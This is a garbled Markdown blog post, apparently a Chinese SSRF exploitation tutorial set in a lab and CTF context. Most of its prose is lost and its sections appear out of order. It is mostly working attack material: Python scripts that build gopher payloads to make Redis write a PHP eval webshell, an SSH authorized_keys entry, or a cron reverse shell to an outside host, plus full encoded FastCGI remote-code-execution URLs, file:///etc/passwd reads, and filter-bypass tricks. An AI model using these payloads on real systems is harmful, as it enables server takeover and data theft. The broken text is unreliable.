Redis\n\n![20210113151633.png](https://image.3001.net/images/20210114/1610598023_5fffc6877d72429d2cbae.png!small)\n\nRedisRedisRemote Dictionary Server )ANSI CKey-ValueAPI\n\n> **Redis**\n>\n> Redis  0.0.0.0:6379 ip  Redis  Redis  Redis  Redis  Redis  config ssh /root/.ssh  authotrized\\_keys ssh\n>\n> \n>\n> +   redis  0.0.0.0:6379ip\n>\n> +   redis\n>\n\nSSRF6379RedisRedisGopherRedis Redis  config WebShellSSHShellRedisweb~/.ssh/var/spool/crondbfilenamesavebgsave\n\nRedisIP\n\n![image-20210113190430425](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202356.jpeg)\n\nIP192.168.52.1316379RedisUbuntuSSRF192.168.52.131Redis\n\n### WebShell\n\nredis\n\n```\nflushall  \nset 1 '<?php eval($\\_POST\\[\"whoami\"\\]);?>'  \nconfig set dir /var/www/html  \nconfig set dbfilename shell.php  \nsave\n```\n\nGopher~~~\n\n```\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.52.131\"\nport=\"6379\"\nshell=\"\\\\n\\\\n<?php eval($\\_POST\\[\\\\\"whoami\\\\\"\\]);?>\\\\n\\\\n\"\nfilename=\"shell.php\"\npath=\"/var/www/html\"\npasswd=\"\"\ncmd=\\[\"flushall\",\n\t \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t \\]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/\\_\"\ndef redis\\_format(arr):\n\tCRLF=\"\\\\r\\\\n\"\n\tredis\\_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"\\*\"+str(len(redis\\_arr))\n\tfor x in redis\\_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif \\_\\_name\\_\\_==\"\\_\\_main\\_\\_\":\n\tfor x in cmd:\n\t\tpayload += urllib.quote(redis\\_format(x))\n\tprint payload\n```\n\npaylaod\n\n![image-20210113175116867](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202688.jpeg)\n\npayloadurlpayloadGETUbuntuSSRFpayload\n\n```\nssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524\\_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A\n```\n\n192.168.52.131WebShell\n\n![image-20210113185919592](https://image.3001.net/images/20210114/1610598027_5fffc68b3b060b67168e8.png!small)\n\n### SSH\n\nRedis~/.sshSSH~/.ssh\n\nredis\n\n```\nflushall  \nset 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami  \n'  \nconfig set dir /root/.ssh/  \nconfig set dbfilename authorized\\_keys  \nsave\n```\n\nGopher\n\n```\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.52.131\"\nport=\"6379\"\nssh\\_pub=\"\\\\n\\\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\\\\n\\\\n\"\nfilename=\"authorized\\_keys\"\npath=\"/root/.ssh/\"\npasswd=\"\"\ncmd=\\[\"flushall\",\n\t \"set 1 {}\".format(ssh\\_pub.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t \\]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/\\_\"\ndef redis\\_format(arr):\n\tCRLF=\"\\\\r\\\\n\"\n\tredis\\_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"\\*\"+str(len(redis\\_arr))\n\tfor x in redis\\_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif \\_\\_name\\_\\_==\"\\_\\_main\\_\\_\":\n\tfor x in cmd:\n\t\tpayload += urllib.quote(redis\\_format(x))\n\tprint payload\n```\n\npayloadurlUbuntuSSRF\n\n```\nssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524568%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E%2F45IEs%2F9a6AWfXb6iwzo%252BD62y8MOmt%252Bsct27ZxGOcRR95FT6zrfFxqt2h56oLwml%2FTrxy5sExSQ%2FcvvLwUTWb3ntJYyh2eGkQnOf2d%252Bax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH%2F4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd%2FbWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ%2FNnHKyWtI%2FOzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe%252BXqQnjxtk4giopiFfRu8winE9scqlIA5Iu%2Fd3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg%2FOOhoA3iKNhJ%2FJT31TU9E24dGh2Ei8K%252BPpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl%252BSOsVHpNqwFcrgsq%2FWR5BGqnu54vTTdJh0pSrl%252BtniHEnWWU%253D%2520root%2540whoami%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized\\_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A\n```\n\n192.168.52.131SSH\n\n![image-20210113185745287](https://image.3001.net/images/20210114/1610598028_5fffc68c0f8d37e46a560.png!small)\n\nssh\n\n![image-20210113193746288](https://image.3001.net/images/20210114/1610598029_5fffc68d802a6e5c757d2.png!small)\n\n### Shell\n\n**Centos**\n\nredis\n\n```\nflushall  \nset 1 '\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1\\\\n\\\\n'  \nconfig set dir /var/spool/cron/  \nconfig set dbfilename root  \nsave  \n\n// 47.xxx.xxx.72vpsIP\n\nGopher\n\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.52.131\"\nport=\"6379\"\nreverse\\_ip=\"47.xxx.xxx.72\"\nreverse\\_port=\"2333\"\ncron=\"\\\\n\\\\n\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i >& /dev/tcp/%s/%s 0>&1\\\\n\\\\n\\\\n\\\\n\"%(reverse\\_ip,reverse\\_port)\nfilename=\"root\"\npath=\"/var/spool/cron\"\npasswd=\"\"\ncmd=\\[\"flushall\",\n\t \"set 1 {}\".format(cron.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t \\]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/\\_\"\ndef redis\\_format(arr):\n\tCRLF=\"\\\\r\\\\n\"\n\tredis\\_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"\\*\"+str(len(redis\\_arr))\n\tfor x in redis\\_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif \\_\\_name\\_\\_==\"\\_\\_main\\_\\_\":\n\tfor x in cmd:\n\t\tpayload += urllib.quote(redis\\_format(x))\n\tprint payload\n```\n\npayloadurlUbuntuSSRF192.168.52.131vpsshell\n\n![image-20210113184927766](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202362.jpeg)\n\n[\\[GKCTF2020\\]EZ-EzWeb](https://blog.csdn.net/qq_45521281/article/details/106532501)Redis\n\n## FastCGI\n\nFastCGIFast Common Gateway InterfaceFastCGIWebFastCGICGIFastCGICGI\n\n> ********ApacheWebCGICGIPHPPHPphp.iniCGIWeb serverPHP Web\n>\n> CGIFastCGICGICGI**CGI****FastCGICGI** \n\n### php-fpm\n\nFPMFastCGI FastCGI PHP FastCGI \n\nFastCGI`SCRIPT_FILENAME': '/var/www/html/index.php`php-fpmphp-fpm\n\nPHP 5.3.9PHPphp-fpmphpphp4PHPPHP\\_ADMIN\\_VALUEPHP\\_VALUEPHP\n\nPHP`auto_prepend_file = php://input;allow_url_include = On`PHP`auto_prepend_file``php://input`POSTFastCGIbodyphp-fpm\n\n[SSRFFastCGI](https://bbs.ichunqiu.com/thread-58455-1-1.html)\n\n\n\n![image-20210113225311760](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202250.jpeg)\n\nWEBUbuntu192.168.43.166SSRF\n\n![image-20210113211319025](https://image.3001.net/images/20210114/1610598034_5fffc69243862a502d80a.png!small)\n\nWEBUbuntuFastCGISSRFFastCGI\n\n> fpm0.0.0.0:9000php-fpmSSRF9000php-fpmfcgi\\_expphp-fpm\n>\n> fpm0.0.0.0:9000php-fpmUbuntuSSRFphp-fpmUbuntuSSRF\n\n### fcgi\\_exp\n\n[https://github.com/piaca/fcgi\\_exp](https://github.com/piaca/fcgi_exp)\n\nphp-fpmphp-fpmpayload\n\ngo\n\ngo build fcgi\\_exp.go                    # fcgi\\_exp.go\n\n`nc -lvvp 2333 > fcg_exp.txt`2333 fcgi\\_exppayload2333payload\n\n./fcgi\\_exp system 127.0.0.1 2333 /var/www/html/index.php \"id\"\n\n![image-20210113205718209](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202135.jpeg)\n\nfcg\\_exp.txtpayload\n\n![image-20210113205857913](https://image.3001.net/images/20210114/1610598036_5fffc694cc3e3da7a21ec.png!small)\n\nfcg\\_exp.txtpayloadurl\n\n\\# -\\*- coding: UTF-8 -\\*-  \nfrom urllib.parse import quote, unquote, urlencode  \n\nfile = open('fcg\\_exp.txt','r')  \npayload = file.read()  \nprint(\"gopher://127.0.0.1:9000/\\_\"+quote(payload).replace(\"%0A\",\"%0D\").replace(\"%2F\",\"/\"))\n\npythonpayload\n\n![image-20210113210102251](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202737.jpeg)\n\npayloadurlpayload?url=\n\n```\nssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP%2F1.1%250E%2502CONTENT\\_LENGTH56%250E%2504REQUEST\\_METHODPOST%2509%255BPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Ddisable\\_functions%2520%253D%2520%250Dsafe\\_mode%2520%253D%2520Off%250Dauto\\_prepend\\_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT\\_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT\\_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E\n```\n\n\n\n![image-20210113211227610](https://image.3001.net/images/20210114/1610598040_5fffc6982e020c76d98d2.png!small)\n\n### Gopherus\n\n[https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)\n\nGopherpayloadSSRFRedisFastCGIMySql\n\nGopherusFastCGIpayload\n\npython gopherus.py --exploit fastcgi  \n/var/www/html/index.php    # php  \nid    # \n\n![image-20201206134630782](https://image.3001.net/images/20210114/1610598041_5fffc69924b889c84f935.png!small)\n\npayloadurlpayload?url=\n\n```\nssrf.php?url=gopher%3A//127.0.0.1%3A9000/\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP/1.1%250E%2502CONTENT\\_LENGTH54%250E%2504REQUEST\\_METHODPOST%2509KPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Adisable\\_functions%2520%253D%2520%250Aauto\\_prepend\\_file%2520%253D%2520php%253A//input%250F%2517SCRIPT\\_FILENAME/var/www/html/index.php%250D%2501DOCUMENT\\_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500\n```\n\n![image-20210113211649519](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202253.jpeg)\n\n\n\n## MySql\n\n![20210113152106.png](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202474.jpeg)\n\nMySqlMySQLMySQL / (scramble)\n\n(scramble)Gopher\n\n\n\n![image-20210113225607672](https://image.3001.net/images/20210114/1610598044_5fffc69c8db745aea464b.png!small)\n\nUbuntuWEBSSRFMySqlwhoami\n\nGopherusUbuntuMySqlpayload\n\npython gopherus.py --exploit mysql  \nwhoami    #   \nshow databases;    # sql\n\npayload\n\n![image-20210114004602164](https://image.3001.net/images/20210114/1610598046_5fffc69e8d085bc01c7a3.png!small)\n\npaylaodurlpayload?url=......\n\n## Ending......\n\nSSRF\n\n+   ssrf-lab[https://github.com/fengwenhua/ssrf-lab](https://github.com/fengwenhua/ssrf-lab)\n\n REST API  WebHook  SSRF [https://www.heibai.org/post/1287.html](https://www.heibai.org/post/1287.html)\n\n![20210112124413.jpg](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202809.jpeg)\n\n\n\n[https://whoamianony.top/](https://whoamianony.top/)\n\n>  [https://blog.csdn.net/Ping\\_Pig/article/details/99412487](https://blog.csdn.net/Ping_Pig/article/details/99412487)\n>\n> [https://www.cnblogs.com/iors/p/9777571.html](https://www.cnblogs.com/iors/p/9777571.html)\n>\n> [https://blog.csdn.net/qq\\_43625917/article/details/104528645?utm\\_source=app](https://blog.csdn.net/qq_43625917/article/details/104528645?utm_source=app)\n>\n> [https://xz.aliyun.com/t/2115](https://xz.aliyun.com/t/2115)\n>\n> [https://blog.csdn.net/weixin\\_36343353/article/details/112277580](https://blog.csdn.net/weixin_36343353/article/details/112277580)\n>\n> [https://blog.csdn.net/cj\\_Allen/article/details/106855893](https://blog.csdn.net/cj_Allen/article/details/106855893)\n>\n> [https://www.redteaming.top/2019/07/15/RedisSSRF/#RedisgopherSSRF](https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Redis%E9%85%8D%E5%90%88gopher%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8CSSRF)\n>\n> [https://bbs.ichunqiu.com/thread-58455-1-1.html](https://bbs.ichunqiu.com/thread-58455-1-1.html)\n>\n> [https://blog.chaitin.cn/gopher-attack-surfaces/](https://blog.chaitin.cn/gopher-attack-surfaces/)\n>\n> [https://www.anquanke.com/post/id/197431#h2-6](https://www.anquanke.com/post/id/197431#h2-6)\n>\n> [https://www.anquanke.com/post/id/145519#h2-14](https://www.anquanke.com/post/id/145519#h2-14)","source":"_posts/SSRF.md","raw":"---\ntitle: SSRF\ndate: 2022-05-17 23:41:21\nexcerpt: SSRF\ncategories: \n---\n\n\n\n![SSRF](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201984.jpeg)\n\n> FreeBufFreeBuf\n\nCTFSSRFSSRFSSRF\n\n## \n\nSSRFServer-Side Request Forgery:SSRF\n\nSSRF URLSSRFWEB\n\nUbuntuWEBUbuntuWEBSSRFWEBRedisMySqlFastCGIWEB![image-20210112220229389](https://image.3001.net/images/20210114/1610597995_5fffc66bd4875385a330e.png!small)\n\n**SSRF**\n\n> 1.  \n>\n> 2.  URL\n>\n> 3.  \n>\n> 4.  /URL\n>\n> 5.  /URLtitle\n>\n> 6.  ssrf\n>\n> 7.  url\n>\n> 8.  mongodbcopyDatabase\n>\n> 9.  \n>\n> 10.  ffpmgImageMagickdocxpdfxml\n>\n> 11.  apiURLgoogleSSRFurlsharewapurllinksrcsourcetargetu3gdisplaysourceURlimageURLdomain\n>\n> 12.  \n>\n\n**SSRF**\n\n> 1.  banner\n>\n> 2.  redismysql\n>\n> 3.  Web\n>\n> 4.  WebHTTP GET/POSTsql\n>\n> 5.  file\n>\n> 6.  \n>\n\n## SSRF\n\n+   file\\_get\\_contents()url\n    \n+   readfile()\n    \n+   fsockopen()Unix \n    \n+   curl\\_exec()cURLcurl\\_setopt()curl\\_exec()curl\\_close() \n    \n+   fopen() URL\n    \n+   ......\n    \n\nSSRF PHPSoapClientSSRF\n\n### file\\_get\\_contents()\n\n\n\n```\n// ssrf.php\n<?php\n$url = $\\_GET\\['url'\\];;\necho file\\_get\\_contents($url);\n?>\n```\n\nfile\\_get\\_contents() url`ssrf.php?url=../../../../../etc/passwd`paylaod\n\n![image-20210112225820457](https://image.3001.net/images/20210114/1610597996_5fffc66c9d8087b2c3242.png!small)\n\nreadfile()file\\_get\\_contents()\n\n### fsockopen()\n\n`fsockopen($hostname,$port,$errno,$errstr,$timeout)`Unix hostnameurlsockettcp fsockopen()fgets()fgetss()fwrite()fclose()feof()false\n\n\n\n```\n// ssrf.php\n<?php\n$host=$\\_GET\\['url'\\];\n$fp = fsockopen($host, 80, $errno, $errstr, 30);\nif (!$fp) {\n    echo \"$errstr ($errno)<br />\\\\n\";\n} else {\n    $out = \"GET / HTTP/1.1\\\\r\\\\n\";\n    $out .= \"Host: $host\\\\r\\\\n\";\n    $out .= \"Connection: Close\\\\r\\\\n\\\\r\\\\n\";\n    fwrite($fp, $out);\n    while (!feof($fp)) {\n        echo fgets($fp, 128);\n    }\n    fclose($fp);\n}\n?>\n```\n\n`ssrf.php?url=www.baidu.com`ssrf\n\n![image-20210112230552313](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201642.jpeg)\n\n### curl\\_exec()\n\ncurl\\_init(url)cURLcurl\\_setopt()curl\\_exec()curl\\_close() \n\n\n\n```\n// ssrf.php\n<?php \nif (isset($\\_GET\\['url'\\])){\n\t$link = $\\_GET\\['url'\\];\n\t$curlobj = curl\\_init(); //  cURL \n\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);\n\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);\n\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); //  URL \n\t$result=curl\\_exec($curlobj); //  URL \n\tcurl\\_close($curlobj); //  cURL \n```\n\n\n\n\t// $filename = './curled/'.rand().'.txt';\n\t// file\\_put\\_contents($filename, $result); \n\techo $result;\n}\n?>\n\n`ssrf.php?url=www.baidu.com`ssrf\n\n![image-20210112231108247](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201758.jpeg)\n\n### SoapClient\n\nSOAPSOAP XML  WEB PHP  SoapClient SOAP WEB  PHP \n\nSoapClientphp`__call``__call`HTTPHTTPS\n\npublic SoapClient :: SoapClient(mixed $wsdl \\[array $options \\])\n\n+   wsdl\n    \n+   wsdlwsdllocationurilocationSOAPURL uri SOAP\n    \n\nSSRFPayloadnulllocationurilocationtarget\\_url\n\n```\n// ssrf.php  \n<?php  \n$a = new SoapClient(null,array('uri'=>'http://47.xxx.xxx.72:2333', 'location'=>'http://47.xxx.xxx.72:2333/aaa'));  \n$b = serialize($a);  \necho $b;  \n$c = unserialize($b);  \n$c->a();    // , \\_\\_callssrf  \n?>\n```\n\n47.xxx.xxx.722333ssrf.php47.xxx.xxx.72\n\n![image-20210112234821125](https://image.3001.net/images/20210114/1610597999_5fffc66f758c21c129c42.png!small)\n\nssrf\n\nhttp/httpshttpcrlfssrf+crlfhttp[SoapClient+crlfSSRF](https://www.anquanke.com/post/id/202025)\n\n### SSRF\n\nSSRF\n\n+   file  file \n    \n+   dictredis\n    \n+   gophergopherGETPOSTgetpostgophergopherssrf()shell\n    \n+   http/s\n    \n\n\n\n## filehttp/sdict\n\nSSRF\n\n\n\n```\n// ssrf.php\n<?php \nif (isset($\\_GET\\['url'\\])){\n\t$link = $\\_GET\\['url'\\];\n\t$curlobj = curl\\_init(); //  cURL \n\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);\n\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);\n\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); //  URL \n\t$result=curl\\_exec($curlobj); //  URL \n\tcurl\\_close($curlobj); //  cURL \n```\n\n\n\n\t// $filename = './curled/'.rand().'.txt';\n\t// file\\_put\\_contents($filename, $result); \n\techo $result;\n}\n?>\n\n### file\n\npayload\n\nssrf.php?url=file:///etc/passwd  \nssrf.php?url=file:///var/www/html/flag.php\n\n![image-20210113000529370](https://image.3001.net/images/20210114/1610598000_5fffc670560e2d6fed29c.png!small)\n\n![image-20210113000640979](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201861.jpeg)\n\n### http/s\n\n/etc/hosts/proc/net/arp/proc/net/fib\\_trie\n\nIPIPIP\n\n+   C192.168.0.0 - 192.168.255.255\n    \n+   B172.16.0.0 - 172.31.255.255\n    \n+   A10.0.0.0 - 10.255.255.255\n    \n\n\n\n![image-20210113190506825](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201380.jpeg)\n\nWEBUbuntuSSRFpayloadUbuntu\n\nssrf.php?url=http://192.168.52.1  \nssrf.php?url=http://192.168.52.6  \nssrf.php?url=http://192.168.52.25  \n......\n\nburpsuiteIntruder\n\n![image-20210113120505690](https://image.3001.net/images/20210114/1610598003_5fffc67301c9d222a58c6.png!small)\n\n![image-20210113120551977](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201508.jpeg)\n\n192.168.52.130192.168.52.131\n\n![image-20210113120806794](https://image.3001.net/images/20210114/1610598005_5fffc6750b23dd040c364.png!small)\n\n### http/sdict\n\n\n\n![image-20210113190455756](https://image.3001.net/images/20210114/1610598006_5fffc67625206702cdd18.png!small)\n\ndictpayload\n\nssrf.php?url=dict://192.168.52.131:6379/info   // redis  \nssrf.php?url=dict://192.168.52.131:80/info     // http  \nssrf.php?url=dict://192.168.52.130:22/info   // ssh\n\n![image-20210113190244954](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201787.jpeg)\n\n![image-20210113122530377](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201476.jpeg)\n\nburpsuite\n\n## \n\nSSRF\n\n+   WebHTTPHTTPS\n    \n+   [http://www.xxx.com](http://www.xxx.com/)\n    \n+   IP\n    \n+   \n    \n\n### HTTP\n\n [http://www.xxx.com](http://www.xxx.com/)HTTP@[http://www.xxx.com@www.evil.com](http://www.evil.com/)\n\n### 302IP\n\nip**302**\n\n1 [http://xip.io](http://xip.io/)\n\n[http://127.0.0.1.xip.io/flag.php](http://127.0.0.1.xip.io/flag.php)[http://127.0.0.1/1.php](http://127.0.0.1/1.php)[http://nip.io](http://nip.io/)[http://sslip.io](http://sslip.io/)\n\nflag.php\n\n![image-20210113124813254](https://image.3001.net/images/20210114/1610598008_5fffc67858617e4b20974.png!small)\n\n2 [https://4m.cn/](https://4m.cn/)\n\n![image-20201027163528110](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201164.jpeg)\n\n [https://4m.cn/FjOdQ](https://4m.cn/FjOdQ)302 [http://127.0.0.1/flag.php](http://127.0.0.1/flag.php)WAF\n\n![image-20210113124727560](https://image.3001.net/images/20210114/1610598010_5fffc67a644209d507f01.png!small)\n\n### IP\n\nipWAFphp\n\n```\n<?php  \n$ip = '127.0.0.1';  \n$ip = explode('.',$ip);  \n$r = ($ip\\[0\\] << 24) | ($ip\\[1\\] << 16) | ($ip\\[2\\] << 8) | $ip\\[3\\] ;  \nif($r < 0) {  \n$r += 4294967296;  \n}  \necho \":\";     // 2130706433  \necho $r;  \necho \":\";     // 0177.0.0.1  \necho decoct($r);  \necho \":\";   // 0x7f.0.0.1  \necho dechex($r);  \n?>\n```\n\n\n\n### 127.0.0.1\n\nhttp://localhost/         # localhost127.0.0.1  \nhttp://0/                 # 0window0.0.0.0liunx127.0.0.1  \nhttp://\\[0:0:0:0:0:ffff:127.0.0.1\\]/    # liunxwindow  \nhttp://\\[::\\]:80/           # liunxwindow  \nhttp://127001/       #   \nhttp://...  \nhttp://127.1/  \nhttp://127.00000.00000.001/ # 0127.0.0.1\n\n### \n\n`file_get_contents()`PHP`file_get_contents()`include()\n\n\n\n```\n// ssrf.php  \n<?php  \nhighlight\\_file(\\_\\_FILE\\_\\_);  \nif(!preg\\_match('/^https/is',$\\_GET\\['url'\\])){  \ndie(\"no hack\");  \n}  \necho file\\_get\\_contents($\\_GET\\['url'\\]);  \n?>\n```\n\nurlhttps\n\nhttpsssss://\n\n`file_get_contents()`httpsssss://\n\nssrf.php?url=httpsssss://../../../../../../etc/passwd\n\n![image-20210113130534208](https://image.3001.net/images/20210114/1610598011_5fffc67b28e67ca0b6d7f.png!small)\n\nSSRF\n\n### URL\n\nOrange Tsai2017 BlackHat [A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)readfileparse\\_urlcurlparse\\_url\n\n**1readfileparse\\_url**\n\n\n\n```\n// ssrf.php\n<?php\n$url = 'http://'. $\\_GET\\[url\\];\n$parsed = parse\\_url($url);\nif( $parsed\\[port\\] == 80 ){  // url80\n\treadfile($url);\n} else 